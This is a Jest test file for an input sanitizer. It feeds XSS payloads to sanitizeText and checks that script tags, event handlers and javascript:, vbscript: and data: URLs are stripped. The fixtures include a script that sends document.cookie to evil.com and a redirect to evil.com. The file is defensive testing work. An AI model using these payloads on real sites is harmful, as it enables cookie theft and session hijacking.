/**
 * Tests for Sanitize - Input Sanitization for Security
 */

import { sanitizeText } from '../sanitize';

describe('sanitizeText', () => {
  describe('Basic Input Handling', () => {
    it('should return empty string for null input', () => {
      expect(sanitizeText(null)).toBe('');
    });

    it('should return empty string for undefined input', () => {
      expect(sanitizeText(undefined)).toBe('');
    });

    it('should return empty string for empty string', () => {
      expect(sanitizeText('')).toBe('');
    });

    it('should return plain text unchanged', () => {
      expect(sanitizeText('Hello World')).toBe('Hello World');
    });

    it('should preserve whitespace in plain text', () => {
      expect(sanitizeText('  Hello   World  ')).toBe('  Hello   World  ');
    });

    it('should preserve newlines', () => {
      expect(sanitizeText('Line 1\nLine 2')).toBe('Line 1\nLine 2');
    });

    it('should preserve special characters', () => {
      expect(sanitizeText('Test & Test @ Test # Test')).toBe(
        'Test & Test @ Test # Test'
      );
    });

    it('should handle numbers', () => {
      expect(sanitizeText('12345')).toBe('12345');
    });

    it('should convert non-string to string', () => {
      expect(sanitizeText(123 as any)).toBe('123');
    });
  });

  describe('Script Tag Removal', () => {
    it('should remove basic script tags', () => {
      const input = '<script>alert("xss")</script>Hello';
      expect(sanitizeText(input)).toBe('Hello');
    });

    it('should remove script tags with attributes', () => {
      const input = '<script src="evil.js">alert("xss")</script>Hello';
      expect(sanitizeText(input)).toBe('Hello');
    });

    it('should remove script tags with type attribute', () => {
      const input = '<script type="text/javascript">alert("xss")</script>Hello';
      expect(sanitizeText(input)).toBe('Hello');
    });

    it('should remove multiple script tags', () => {
      const input =
        '<script>alert(1)</script>Hello<script>alert(2)</script>World';
      expect(sanitizeText(input)).toBe('HelloWorld');
    });

    it('should remove nested content in script tags', () => {
      const input = '<script>document.write("<div>Evil</div>")</script>Safe';
      expect(sanitizeText(input)).toBe('Safe');
    });

    it('should handle script tags with newlines', () => {
      const input = `<script>
        var x = 1;
        alert(x);
      </script>Clean`;
      expect(sanitizeText(input)).toBe('Clean');
    });

    it('should handle script tags with special characters', () => {
      const input = '<script>alert("Hello & <World>")</script>Text';
      expect(sanitizeText(input)).toBe('Text');
    });
  });

  describe('Event Handler Removal', () => {
    it('should remove onclick handlers', () => {
      const input = '<div onclick="alert(1)">Hello</div>';
      expect(sanitizeText(input)).toBe('Hello');
    });

    it('should remove onerror handlers', () => {
      const input = '<img onerror="alert(1)" src="x">Text';
      expect(sanitizeText(input)).toBe('Text');
    });

    it('should remove onload handlers', () => {
      const input = '<body onload="malicious()">Content</body>';
      expect(sanitizeText(input)).toBe('Content');
    });

    it('should remove onmouseover handlers', () => {
      const input = '<span onmouseover="evil()">Hover</span>';
      expect(sanitizeText(input)).toBe('Hover');
    });

    it('should remove onfocus handlers', () => {
      const input = '<input onfocus="steal()" value="test">';
      expect(sanitizeText(input)).toBe('');
    });

    it('should remove onchange handlers', () => {
      const input = '<select onchange="track()"><option>1</option></select>';
      expect(sanitizeText(input)).toBe('1');
    });

    it('should remove handlers with single quotes', () => {
      const input = "<div onclick='alert(1)'>Hello</div>";
      expect(sanitizeText(input)).toBe('Hello');
    });

    it('should remove handlers without quotes', () => {
      const input = '<div onclick=alert(1)>Hello</div>';
      expect(sanitizeText(input)).toBe('Hello');
    });

    it('should remove multiple event handlers', () => {
      const input =
        '<div onclick="a()" onmouseover="b()" onerror="c()">Text</div>';
      expect(sanitizeText(input)).toBe('Text');
    });
  });

  describe('Dangerous Protocol Removal', () => {
    it('should remove javascript: protocol', () => {
      const input = '<a href="javascript:alert(1)">Click</a>';
      expect(sanitizeText(input)).toBe('Click');
    });

    it('should remove javascript: in mixed case', () => {
      const input = '<a href="JavaScript:alert(1)">Click</a>';
      expect(sanitizeText(input)).toBe('Click');
    });

    it('should remove vbscript: protocol', () => {
      const input = '<a href="vbscript:msgbox(1)">Click</a>';
      expect(sanitizeText(input)).toBe('Click');
    });

    it('should remove data: protocol', () => {
      const input = '<a href="data:text/html,<script>alert(1)</script>">Link</a>';
      expect(sanitizeText(input)).toBe('Link');
    });

    it('should remove protocols in uppercase', () => {
      const input = '<a href="JAVASCRIPT:alert(1)">Click</a>';
      expect(sanitizeText(input)).toBe('Click');
    });

    it('should preserve safe protocols', () => {
      const input = 'Visit https://example.com or http://test.com';
      expect(sanitizeText(input)).toBe(
        'Visit https://example.com or http://test.com'
      );
    });
  });

  describe('HTML Tag Removal', () => {
    it('should remove basic HTML tags', () => {
      const input = '<div>Hello</div>';
      expect(sanitizeText(input)).toBe('Hello');
    });

    it('should remove self-closing tags', () => {
      const input = 'Line 1<br/>Line 2';
      expect(sanitizeText(input)).toBe('Line 1Line 2');
    });

    it('should remove img tags', () => {
      const input = '<img src="x.jpg" alt="Image">Text';
      expect(sanitizeText(input)).toBe('Text');
    });

    it('should remove link tags', () => {
      const input = '<a href="url">Click here</a>';
      expect(sanitizeText(input)).toBe('Click here');
    });

    it('should remove nested tags', () => {
      const input = '<div><span><b>Bold</b></span></div>';
      expect(sanitizeText(input)).toBe('Bold');
    });

    it('should remove tags with attributes', () => {
      const input = '<div class="test" id="main" data-value="123">Content</div>';
      expect(sanitizeText(input)).toBe('Content');
    });

    it('should remove multiple different tags', () => {
      const input = '<p>Para</p><h1>Header</h1><span>Span</span>';
      expect(sanitizeText(input)).toBe('ParaHeaderSpan');
    });

    it('should handle malformed tags', () => {
      const input = '<div>Hello<//div>';
      expect(sanitizeText(input)).toBe('Hello');
    });

    it('should remove tags with newlines', () => {
      const input = `<div
        class="test"
        id="main">
        Content
      </div>`;
      expect(sanitizeText(input).trim()).toBe('Content');
    });
  });

  describe('Combined XSS Attack Vectors', () => {
    it('should handle script tag with event handler', () => {
      const input = '<script onclick="evil()">alert(1)</script>Safe';
      expect(sanitizeText(input)).toBe('Safe');
    });

    it('should handle img with onerror and javascript protocol', () => {
      const input =
        '<img src="javascript:alert(1)" onerror="alert(2)">Text';
      expect(sanitizeText(input)).toBe('Text');
    });

    it('should handle complex nested attack', () => {
      const input = `
        <div onclick="malicious()">
          <script>alert("xss")</script>
          <img src="x" onerror="alert(1)">
          <a href="javascript:void(0)">Link</a>
          Safe Content
        </div>
      `;
      const result = sanitizeText(input);
      expect(result).toContain('Safe Content');
      expect(result).not.toContain('script');
      expect(result).not.toContain('onclick');
      expect(result).not.toContain('onerror');
    });

    it('should handle SVG-based XSS', () => {
      const input = '<svg onload="alert(1)"><circle/></svg>Text';
      expect(sanitizeText(input)).toBe('Text');
    });

    it('should handle iframe injection', () => {
      const input =
        '<iframe src="javascript:alert(1)"></iframe>Safe Content';
      expect(sanitizeText(input)).toBe('Safe Content');
    });

    it('should handle object/embed tags', () => {
      const input = '<object data="javascript:alert(1)"></object>Text';
      expect(sanitizeText(input)).toBe('Text');
    });
  });

  describe('Edge Cases', () => {
    it('should handle very long input', () => {
      const longText = 'A'.repeat(10000);
      const input = `<div>${longText}</div>`;
      expect(sanitizeText(input)).toBe(longText);
    });

    it('should handle deeply nested tags', () => {
      const input = '<div><div><div><div><div>Deep</div></div></div></div></div>';
      expect(sanitizeText(input)).toBe('Deep');
    });

    it('should handle tags without content', () => {
      const input = '<div></div><span></span><p></p>';
      expect(sanitizeText(input)).toBe('');
    });

    it('should handle incomplete tags', () => {
      const input = '<div>Hello<span>World';
      expect(sanitizeText(input)).toBe('HelloWorld');
    });

    it('should handle tag-like text', () => {
      const input = 'Use <angle brackets> for comparison like 3 < 5';
      // The sanitizer removes <angle brackets> but preserves standalone <
      expect(sanitizeText(input)).toBe('Use  for comparison like 3 < 5');
    });

    it('should handle multiple consecutive tags', () => {
      const input = '<<<div>>>Text</div>>>';
      // Removes <<div>> and </div>, leaving >> before Text and >> after
      expect(sanitizeText(input)).toBe('>>Text>>');
    });

    it('should handle mixed content', () => {
      const input = 'Safe<script>evil()</script>More Safe<b>Bold</b>End';
      expect(sanitizeText(input)).toBe('Safe' + 'More Safe' + 'Bold' + 'End');
    });

    it('should handle unicode characters', () => {
      const input = '<div>Hello 世界 🌍</div>';
      expect(sanitizeText(input)).toBe('Hello 世界 🌍');
    });

    it('should handle empty tags with attributes', () => {
      const input = '<div class="test" onclick="evil()"></div>Text';
      expect(sanitizeText(input)).toBe('Text');
    });

    it('should handle comments (not filtered but tags inside are)', () => {
      const input = '<!-- <script>alert(1)</script> -->Text';
      expect(sanitizeText(input)).toBe('Text');
    });
  });

  describe('Real-World Attack Patterns', () => {
    it('should prevent stored XSS in user comments', () => {
      const userComment = `
        Great article!
        <script>
          fetch('https://evil.com/steal?cookie=' + document.cookie);
        </script>
      `;
      const sanitized = sanitizeText(userComment);
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).toContain('Great article!');
    });

    it('should prevent XSS in user profile names', () => {
      const userName = '<img src=x onerror="alert(document.cookie)">';
      const sanitized = sanitizeText(userName);
      expect(sanitized).toBe('');
    });

    it('should prevent XSS in job descriptions', () => {
      const jobDesc = `
        Looking for developer
        <div onclick="location.href='https://phishing.com'">
          Click for details
        </div>
      `;
      const sanitized = sanitizeText(jobDesc);
      expect(sanitized).not.toContain('onclick');
      expect(sanitized).toContain('Looking for developer');
      expect(sanitized).toContain('Click for details');
    });

    it('should prevent XSS in search queries', () => {
      const searchQuery =
        '"><script>alert(String.fromCharCode(88,83,83))</script>';
      const sanitized = sanitizeText(searchQuery);
      // Sanitizer removes <script> tags but doesn't HTML-encode > character
      expect(sanitized).toBe('">');
    });

    it('should prevent reflected XSS patterns', () => {
      const input = '?search=<script>document.location="http://evil.com"</script>';
      const sanitized = sanitizeText(input);
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).toContain('?search=');
    });
  });

  describe('Security Boundary Testing', () => {
    it('should remove all variations of onclick', () => {
      const variations = [
        'onclick',
        'onClick',
        'ONCLICK',
        'OnClick',
        'onCLICK',
      ];
      variations.forEach((variant) => {
        const input = `<div ${variant}="alert(1)">Text</div>`;
        const result = sanitizeText(input);
        expect(result).toBe('Text');
        expect(result.toLowerCase()).not.toContain('onclick');
      });
    });

    it('should handle null bytes', () => {
      const input = '<div>Hello\x00World</div>';
      expect(sanitizeText(input)).toBe('Hello\x00World');
    });

    it('should handle encoded characters in tags', () => {
      const input = '&lt;script&gt;alert(1)&lt;/script&gt;Text';
      // Already encoded, should preserve
      expect(sanitizeText(input)).toBe('&lt;script&gt;alert(1)&lt;/script&gt;Text');
    });
  });

  describe('Performance', () => {
    it('should handle input with thousands of tags efficiently', () => {
      const manyTags = '<div>'.repeat(1000) + 'Content' + '</div>'.repeat(1000);
      const start = Date.now();
      const result = sanitizeText(manyTags);
      const duration = Date.now() - start;

      expect(result).toBe('Content');
      expect(duration).toBeLessThan(1000); // Should complete in under 1 second
    });
  });
});
